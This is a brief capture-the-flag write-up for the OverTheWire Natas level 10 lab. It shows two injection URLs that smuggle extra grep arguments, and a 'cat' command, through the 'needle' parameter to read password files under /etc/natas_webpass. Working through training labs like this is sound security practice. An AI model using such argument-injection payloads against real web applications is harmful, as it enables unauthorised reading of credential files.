Task:
    We look at the script and realize that it is vulnerable to an injection. But, now we have some validations.
    
Solution:
    http://natas10.natas.labs.overthewire.org/?needle=a\cat%20/etc/natas_webpass/natas10&submit=Search
        - this gives us an odd result - it says dictionary.txt and has a bunch of words
    http://natas10.natas.labs.overthewire.org/?needle=.*%20/etc/natas_webpass/natas11&submit=Search

    The trick is to realize u can search for multiple files with grep
